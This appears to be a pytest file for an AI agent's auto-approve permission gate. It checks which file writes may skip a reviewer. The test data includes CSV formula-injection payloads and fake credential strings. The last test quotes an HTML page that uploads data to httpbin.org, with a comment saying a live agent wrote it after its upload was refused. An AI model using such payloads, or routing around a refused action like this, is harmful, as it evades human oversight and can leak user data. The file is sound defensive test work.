"""Auto-approve's inert-writes tier (OPE-233).

A write inside the session's folders runs without a reviewer call when it is a plain
document or raster image (not JSON or YAML, not a build or install input, not another AI
tool's instruction file), its name and content don't look secret, it isn't a protected
file, and it can be undone: a new file, a git-tracked file with no uncommitted changes, or a file the agent
itself wrote earlier in the session. Every other write reaches the reviewer exactly as
before. Behind `inert_writes`: "off" (default) → "audit" (decision unchanged, "would
allow" recorded) → "on"."""

from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

import pytest

from coworker.events import EventType
from coworker.providers import AssistantTurn
from coworker.permissions import INERT_WRITE_REASON, Mode, PermissionEngine
from coworker.provenance import SessionFiles
from test_auto_approve import _engine, _FakeReviewer, _run, _tool_turn

git = pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")


def _gate(tmp_path: Path, inert: str = "on", mode: Mode = Mode.AUTO_APPROVE, **kw) -> PermissionEngine:
    return PermissionEngine(workspace_root=tmp_path, mode=mode, inert_writes=inert, **kw)


def _write(path: str, content: str = "hello", overwrite: bool = False) -> dict:
    return {"path": path, "content": content, "overwrite": overwrite}


def _repo(tmp_path: Path, files: dict[str, str]) -> None:
    run = lambda *a: subprocess.run(["git", *a], cwd=tmp_path, check=True, capture_output=True)  # noqa: E731
    run("init", "-q")
    for name, text in files.items():
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(text, encoding="utf-8")
    run("add", "-A")
    run("-c", "user.name=t", "-c", "user.email=t@example.invalid", "commit", "-qm", "init")


def _ran_without_reviewer(d) -> bool:
    return d.allowed and d.reason.startswith(INERT_WRITE_REASON) and d.tier == "inert_write"


def _goes_to_reviewer(d) -> bool:
    return not d.allowed and d.needs_user and not d.human_only


# -- the flag ----------------------------------------------------------------------


def test_off_by_default_every_write_still_reaches_the_reviewer(tmp_path):
    d = PermissionEngine(workspace_root=tmp_path, mode=Mode.AUTO_APPROVE).evaluate(
        "write_file", _write("notes.md")
    )
    assert _goes_to_reviewer(d) and d.tier == ""


def test_on_a_new_inert_file_runs_without_the_reviewer(tmp_path):
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("summary.txt")))


def test_audit_mode_records_would_allow_but_changes_nothing(tmp_path):
    d = _gate(tmp_path, "audit").evaluate("write_file", _write("summary.txt"))
    assert _goes_to_reviewer(d)
    assert d.reason == "requires approval"
    assert d.tier == "inert_write" and d.tier_audit_only


@pytest.mark.parametrize("mode", [Mode.INTERACTIVE, Mode.CUSTOM])
def test_only_auto_approve_mode_uses_the_tier(tmp_path, mode):
    d = _gate(tmp_path, mode=mode).evaluate("write_file", _write("summary.txt"))
    assert not d.allowed and d.tier == ""


def test_an_unknown_flag_value_means_off(tmp_path):
    d = _gate(tmp_path, "yes please").evaluate("write_file", _write("summary.txt"))
    assert _goes_to_reviewer(d)


# -- what counts as inert --------------------------------------------------------------


@pytest.mark.parametrize(
    "path",
    ["notes.md", "out/report.txt", "data/rows.csv", "data/rows.tsv", "chart.png", "docs/guide.rst",
     "run.log", "NOTES.MD", "README.md", "CHANGELOG.md", "LICENSE.txt", "docs/design.markdown",
     # names that only look like the exclusions below
     "docs/claude-notes.md", "notes/agents-meeting.txt", "cursor-tips.md", "cmake-notes.txt"],
)
def test_inert_types_are_eligible(tmp_path, path):
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "path",
    # Devika, 28 Oct 2026: JSON and YAML left the tier. Tools read them to decide what to
    # run, and no list of tool-config names can be complete. The reviewer sees the content.
    # result.json and cfg/settings.yaml were eligible before this change.
    ["result.json", "cfg/settings.yaml", "data/rows.jsonl", "config.yml", "nodemon.json",
     "docker-compose.override.yml", "deploy/playbook.yml", "buildspec.yml",
     "package.json", ".eslintrc.json"],
)
def test_json_and_yaml_go_to_the_reviewer(tmp_path, path):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "path",
    # Text files that decide what gets built, installed or tested: CMake runs
    # CMakeLists.txt, pip installs what requirements and constraints files list, and
    # pytest runs test*.txt files as doctests by default.
    ["CMakeLists.txt", "src/lib/cmakelists.TXT", "requirements.txt", "REQUIREMENTS.txt",
     "requirements-dev.txt", "requirements_test.txt", "dev-requirements.txt",
     "requirements/base.txt", "requirements/dev/extra.txt", "constraints.txt",
     "ci/constraints-py311.txt", "test_examples.txt", "docs/testing.txt",
     # files that pick what a platform installs: Heroku, Streamlit Cloud, Binder
     "runtime.txt", "packages.txt", "apt.txt"],
)
def test_build_and_install_inputs_go_to_the_reviewer(tmp_path, path):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "path",
    # Instructions another AI coding tool reads into its prompt on its next run.
    ["CLAUDE.md", "claude.MD", "sub/dir/CLAUDE.md", "CLAUDE.local.md", "GEMINI.md", "QWEN.md",
     "CRUSH.md", "WARP.md", "AGENT.md", "AGENTS.override.md", "CONVENTIONS.md",
     ".github/copilot-instructions.md", ".github/instructions/python.instructions.md",
     "src/api.instructions.md", ".github/prompts/release.prompt.md",
     ".github/chatmodes/plan.chatmode.md", ".github/agents/reviewer.agent.md",
     ".claude/commands/deploy.md", ".claude/agents/helper.md", "tools/x/SKILL.md",
     ".cursor/rules/style.md", ".Cursor/Rules/Style.md", ".windsurf/rules/rules.md",
     ".clinerules/01-style.md", ".roo/rules/style.md", ".kiro/steering/product.md",
     ".amazonq/rules/style.md", ".continue/rules/style.md", ".junie/guidelines.md",
     ".augment/rules/style.md", ".gemini/styleguide.md", ".agent/rules/style.md",
     ".agents/rules/style.md", ".openhands/microagents/repo.md", ".trae/rules/project_rules.md",
     ".codex/notes.md", ".opencode/agent/review.md", ".kilocode/rules/style.md",
     ".aiassistant/rules/style.md", ".zencoder/rules/style.md"],
)
def test_other_ai_tools_instruction_files_go_to_the_reviewer(tmp_path, path):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize("folder", ["requirements", "agents", "Requirements Review"])
def test_the_workspace_folder_name_itself_is_not_matched(tmp_path, folder):
    # Folder rules look only at the path under the writable root: a workspace that is
    # itself called `requirements` keeps the tier for its notes.
    ws = tmp_path / folder
    ws.mkdir()
    assert _ran_without_reviewer(_gate(ws).evaluate("write_file", _write("notes.md")))
    assert _ran_without_reviewer(_gate(ws).evaluate("write_file", _write("notes.txt")))


def test_a_document_in_a_requirements_folder_is_still_eligible(tmp_path):
    # pip reads `requirements/*.txt`; it does not read a Markdown file kept there.
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("requirements/notes.md")))


def test_a_second_writable_root_is_scoped_the_same_way(tmp_path):
    extra = tmp_path / "requirements"
    extra.mkdir()
    gate = PermissionEngine(
        workspace_root=tmp_path, mode=Mode.AUTO_APPROVE, inert_writes="on",
        roots=[{"path": tmp_path, "writable": True}, {"path": extra, "writable": True}],
    )
    assert _ran_without_reviewer(gate.evaluate("write_file", _write(str(extra / "notes.md"))))
    assert _goes_to_reviewer(gate.evaluate("write_file", _write("requirements/base.txt")))


# -- spreadsheet formulas ------------------------------------------------------------------


@pytest.mark.parametrize(
    "content",
    [
        'name,total\nbob,=HYPERLINK("http://x","click")\n',
        "name,total\nbob,\"=cmd|'/c calc'!A0\"\n",
        "a,b\n@SUM(1;2),1\n",
        "a,b\n+cmd|' /C calc'!A0,1\n",
        "a,b\n-2+3+cmd|' /C calc'!A0,1\n",
        "a\tb\n=1+1\t2\n",
        "a,b\n 'x',=1+1\n",  # leading space and quote do not hide the formula
    ],
)
def test_a_csv_cell_that_starts_a_formula_goes_to_the_reviewer(tmp_path, content):
    # A spreadsheet app runs a cell that starts with = @ + or - when the file is opened.
    # Opening a file is not a command anyone reviews, so the reviewer must see it first.
    name = "rows.tsv" if "\t" in content else "rows.csv"
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(name, content)))


@pytest.mark.parametrize(
    "content",
    ["name,total\nbob,-5\nann,+1.5\n", "x,y\n-0.25,-.5\n", "a,b\n1,2\n",
     'note\n"well, =not at the start"\n', "a,b\n,\n"],
)
def test_ordinary_csv_data_is_still_eligible(tmp_path, content):
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("rows.csv", content)))


def test_a_formula_in_a_markdown_file_is_fine(tmp_path):
    # Only spreadsheet files are opened by an app that evaluates cells.
    text = "| a | b |\n|---|---|\n| =SUM(1,2) | x |\n"
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("table.md", text)))


def test_a_csv_patch_is_checked_on_its_added_lines(tmp_path):
    bad = "*** Begin Patch\n*** Add File: rows.csv\n+a,b\n+=1+1,2\n*** End Patch"
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": bad}))
    ok = "*** Begin Patch\n*** Add File: rows.csv\n+a,b\n+1,2\n+-5,+2\n*** End Patch"
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": ok}))


def test_a_csv_replace_is_checked_on_the_new_text(tmp_path):
    files = SessionFiles(tmp_path)
    gate = _gate(tmp_path, agent_wrote=files.wrote)
    (tmp_path / "rows.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    files.record("write_file", _write("rows.csv", "a,b\n1,2\n"), "ok", step=1)
    args = {"path": "rows.csv", "old": "1,2", "new": "=1+1,2"}
    assert _goes_to_reviewer(gate.evaluate("replace_in_file", args))


@pytest.mark.parametrize(
    "path",
    ["make_report.py", "build.sh", "run.ps1", "app.js", "main.ts", "lib.rb", "x.c", "Makefile",
     "Dockerfile", "fix.patch", "x.pth", "noext",
     # document-like formats that can carry script
     "page.html", "page.HTM", "chart.svg", "feed.xml", "report.pdf"],
)
def test_code_scripts_and_unknown_types_go_to_the_reviewer(tmp_path, path):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "path",
    # Files that run on a later action are human-only through the protected-file floor
    # (OPE-231), which runs before the tier: stricter than the reviewer, never the tier.
    [".vscode/settings.json", ".vscode/launch.json", "conftest.py", "sitecustomize.py"],
)
def test_files_that_run_later_are_human_only_before_the_tier(tmp_path, path):
    d = _gate(tmp_path).evaluate("write_file", _write(path))
    assert d.human_only and not d.allowed and d.tier == ""


@pytest.mark.parametrize(
    "path",
    [".env", ".env.local", "secrets/.ENV.production", "server.pem", "api_key.txt", "API-KEY.md",
     "credentials.txt", "id_rsa.txt", "my_secrets.md", "token.txt", "password.txt"],
)
def test_secret_looking_names_go_to_the_reviewer(tmp_path, path):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write(path)))


@pytest.mark.parametrize(
    "content",
    [
        "key: sk-abcdefghijklmnopqrstuvwxyz012345",
        "AKIAABCDEFGHIJKLMNOP",
        "-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----",
        "token = ghp_abcdefghijklmnopqrstuvwxyz0123456789",
        "slack: xoxb-1234567890-abcdefghij",
        'api_key = "Zx9Qw3Er7Ty1Ui5Op2As8Df4Gh6Jk0L"',
    ],
)
def test_secret_looking_content_goes_to_the_reviewer(tmp_path, content):
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write("notes.md", content)))


def test_ordinary_prose_about_keys_is_fine(tmp_path):
    text = "Rotate the API key monthly. The password policy needs 12 characters."
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("policy.md", text)))


# -- floors still win -------------------------------------------------------------------


def test_a_protected_inert_file_stays_human_only(tmp_path):
    # AGENTS.md is markdown, but it is read into every later session's prompt (OPE-231).
    d = _gate(tmp_path).evaluate("write_file", _write("AGENTS.md"))
    assert not d.allowed and d.human_only and d.tier == ""


def test_a_write_outside_the_folders_is_still_refused(tmp_path):
    d = _gate(tmp_path / "ws").evaluate("write_file", _write("../outside.md"))
    assert not d.allowed and not d.needs_user


def test_a_read_only_root_is_still_refused(tmp_path):
    ro = tmp_path / "ro"
    ro.mkdir()
    gate = PermissionEngine(
        workspace_root=ro, mode=Mode.AUTO_APPROVE, inert_writes="on",
        roots=[{"path": ro, "writable": False}],
    )
    d = gate.evaluate("write_file", _write("notes.md"))
    assert not d.allowed and not d.needs_user


# -- reversibility -----------------------------------------------------------------------


def test_overwriting_an_existing_file_without_git_goes_to_the_reviewer(tmp_path):
    (tmp_path / "notes.md").write_text("user's own notes", encoding="utf-8")
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write("notes.md", overwrite=True)))


@git
def test_a_new_file_in_a_repo_is_eligible(tmp_path):
    _repo(tmp_path, {"README.md": "x"})
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("write_file", _write("summary.txt")))


@git
def test_a_tracked_unmodified_file_is_eligible(tmp_path):
    _repo(tmp_path, {"docs/notes.md": "v1"})
    d = _gate(tmp_path).evaluate("replace_in_file", {"path": "docs/notes.md", "old": "v1", "new": "v2"})
    assert _ran_without_reviewer(d)


@git
def test_a_tracked_file_with_uncommitted_changes_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"notes.md": "v1"})
    (tmp_path / "notes.md").write_text("the user's unsaved edit", encoding="utf-8")
    d = _gate(tmp_path).evaluate("write_file", _write("notes.md", overwrite=True))
    assert _goes_to_reviewer(d)


@git
def test_an_untracked_existing_file_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"README.md": "x"})
    (tmp_path / "scratch.md").write_text("not in git", encoding="utf-8")
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("write_file", _write("scratch.md", overwrite=True)))


@git
def test_an_ignored_existing_file_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {".gitignore": "out/\n"})
    (tmp_path / "out").mkdir()
    (tmp_path / "out" / "result.csv").write_text("a,b", encoding="utf-8")
    d = _gate(tmp_path).evaluate("write_file", _write("out/result.csv", overwrite=True))
    assert _goes_to_reviewer(d)


@git
def test_deleting_even_a_tracked_unmodified_file_goes_to_the_reviewer(tmp_path):
    # Devika, 26 Oct 2026: git could restore it, but the reviewer should see every delete.
    # A clearly requested delete is still allowed there (Rule 1b); one taken from a to-do
    # file with no approved plan becomes a card.
    _repo(tmp_path, {"old-notes.txt": "old"})
    patch = "*** Begin Patch\n*** Delete File: old-notes.txt\n*** End Patch"
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


@git
def test_moving_a_file_goes_to_the_reviewer(tmp_path):
    # A move removes the original name, so it is treated like a delete.
    _repo(tmp_path, {"notes.md": "old"})
    patch = (
        "*** Begin Patch\n*** Update File: notes.md\n*** Move to: archive.md\n"
        "@@\n-old\n+old\n*** End Patch"
    )
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


@git
def test_a_patch_that_deletes_one_file_and_adds_another_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"old-notes.txt": "old"})
    patch = (
        "*** Begin Patch\n*** Add File: summary.txt\n+done\n"
        "*** Delete File: old-notes.txt\n*** End Patch"
    )
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


def test_adding_an_inert_file_by_patch_is_still_eligible(tmp_path):
    patch = "*** Begin Patch\n*** Add File: notes.md\n+hi\n*** End Patch"
    assert _ran_without_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


@git
def test_deleting_an_untracked_file_goes_to_the_reviewer(tmp_path):
    _repo(tmp_path, {"README.md": "x"})
    (tmp_path / "keep.txt").write_text("only copy", encoding="utf-8")
    patch = "*** Begin Patch\n*** Delete File: keep.txt\n*** End Patch"
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


def test_a_patch_touching_one_inert_and_one_code_file_goes_to_the_reviewer(tmp_path):
    patch = (
        "*** Begin Patch\n*** Add File: notes.md\n+hi\n"
        "*** Add File: tool.py\n+print(1)\n*** End Patch"
    )
    assert _goes_to_reviewer(_gate(tmp_path).evaluate("apply_patch", {"patch": patch}))


def test_rewriting_a_file_the_agent_wrote_this_session_is_eligible(tmp_path):
    files = SessionFiles(tmp_path)
    gate = _gate(tmp_path, agent_wrote=files.wrote)
    assert _ran_without_reviewer(gate.evaluate("write_file", _write("summary.txt")))
    # The write ran: the file exists now and the engine recorded it.
    (tmp_path / "summary.txt").write_text("hello", encoding="utf-8")
    files.record("write_file", _write("summary.txt"), "ok", step=1)
    assert _ran_without_reviewer(gate.evaluate("write_file", _write("summary.txt", "v2", overwrite=True)))


def test_a_file_the_agent_only_downloaded_is_not_treated_as_its_own(tmp_path):
    files = SessionFiles(tmp_path)
    (tmp_path / "page.html").write_text("<html>", encoding="utf-8")
    files.record("email_download_attachment", {"id": "m1"}, {"path": str(tmp_path / "page.html")}, step=1)
    assert files.match("run_shell", {"command": "bash ./page.html"}, step=2) is not None  # recorded, as a download
    gate = _gate(tmp_path, agent_wrote=files.wrote)
    assert _goes_to_reviewer(gate.evaluate("write_file", _write("page.html", overwrite=True)))


# -- the engine: recorded, never invisible ------------------------------------------------


def _todo_engine(tmp_path, inert: str):
    engine, rows, approvals = _engine(
        tmp_path,
        [
            _tool_turn(("write_file", {"path": "summary.txt", "content": "Weekly summary: 3 tasks done."})),
            _tool_turn(("write_file", {"path": "summary.txt", "content": "Weekly summary: 4 tasks done."})),
            _tool_turn(("write_file", {"path": "tool.py", "content": "print(1)"})),
            AssistantTurn(text="done", finish_reason="stop"),
        ],
    )
    engine.permissions.inert_writes = inert
    engine.reviewer = _FakeReviewer({"write_file": "unsure"})  # it can't see the to-do list
    return engine, rows, approvals


def test_engine_runs_inert_writes_without_the_reviewer_and_records_them(tmp_path):
    engine, rows, approvals = _todo_engine(tmp_path, "on")
    events = _run(engine, "do the tasks in TODO.md")

    asked = [args.get("path") for name, args in engine.reviewer.asked]
    assert asked == ["tool.py"]  # only the code file reached the reviewer
    assert approvals == ["write_file"]  # ...whose "unsure" became the one card
    tier_rows = [r for r in rows if r.get("stage") == "auto_allowed" and INERT_WRITE_REASON in (r.get("reason") or "")]
    assert len(tier_rows) == 2
    origins = [ev.data.get("approval_origin") for ev in events if ev.type == EventType.TOOL_FINISHED]
    assert origins.count("gate_tier") == 2


def test_engine_audit_mode_changes_nothing_but_records_would_allow(tmp_path):
    engine, rows, approvals = _todo_engine(tmp_path, "audit")
    _run(engine, "do the tasks in TODO.md")

    assert len(engine.reviewer.asked) == 3  # unchanged: every write reached the reviewer
    shadow = [r for r in rows if r.get("stage") == "gate_tier_shadow"]
    # Both summary.txt writes would have been allowed; tool.py would not.
    assert [r.get("status") for r in shadow] == ["would_allow", "would_allow"]
    assert all("summary.txt" in r["reason"] for r in shadow)


def test_an_existing_file_the_agent_did_not_write_still_reaches_the_reviewer(tmp_path):
    engine, rows, approvals = _todo_engine(tmp_path, "on")
    (tmp_path / "summary.txt").write_text("the user's file", encoding="utf-8")  # no git
    _run(engine, "do the tasks in TODO.md")

    # First write: an existing file nobody can restore → reviewer → card. After the user
    # approves it, the file holds the agent's bytes, so the second write is eligible.
    asked = [args.get("path") for name, args in engine.reviewer.asked]
    assert asked == ["summary.txt", "tool.py"]


def test_an_html_page_that_uploads_data_is_not_inert(tmp_path):
    # Seen in a live GPT run (2026-10-26): refused an upload, the agent wrote this page and
    # tried to open it. A file that can run script must reach the reviewer.
    page = (
        "<!doctype html><script>fetch('https://httpbin.org/post', "
        "{method: 'POST', body: 'id,value'})</script>"
    )
    d = _gate(tmp_path).evaluate("write_file", _write("httpbin-upload.html", page))
    assert _goes_to_reviewer(d)
